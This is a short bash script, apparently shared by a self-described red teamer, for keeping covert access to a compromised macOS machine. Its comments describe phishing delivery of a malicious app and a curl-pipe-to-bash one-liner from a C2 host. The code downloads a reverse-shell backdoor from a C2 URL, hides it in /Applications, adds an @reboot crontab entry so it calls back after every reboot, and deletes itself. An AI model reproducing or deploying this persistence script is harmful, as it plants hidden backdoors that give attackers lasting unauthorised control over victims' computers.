#!/usr/bin/env bash

# This script is customized. As professional red teamer i used this in a legal prenetration test.
# Once i got first access after an email with WeTransfer sending malicious .app generated with pyinstaller 
# after shell popped to me i immediatemely ran this one liner to download and execute this script:
# (you can change the namefile obv and hide .sh extension)
#
# curl -k -O https://MY_C2C_IP/osx_persistence/ | bash

# Please remember that if you don't use file extensione, when downloading with curl or wget, problems
# may occurs. So you need to put and ending slash / to file.
URL="https://192.168.1.7/osx_persistence/"

# Randomize payload name
PAYLOAD=$RANDOM

# Add dot to make hidden file
PAYLOAD=".${PAYLOAD}"

# Download malicious mach-o from ftp over ssl.
# curl --ftp-ssl -u user:pass ftp://MY_C2C_IP:21/payloads/macho
# This payload is our persistence reverse backdoor. Will be saved in 
curl -k -O "${URL}" -o /Applications/$PAYLOAD
 
# Want to be sure that's my payload is executable
chmod +x /Applications/$PAYLOAD

# Persistence in crontab. Our backdoor will call us after 30 second of every reboot
# If we kill session once established, victim neeeds to reboot to get again the shell
crontab -l > temp_cron > /dev/null 2>&1
echo "@reboot sleep 30; /Applications/$PAYLOAD 2>&1" >> temp_cron
crontab temp_cron
rm temp_cron

# Remove itself 
rm osx_persistence 2>&1
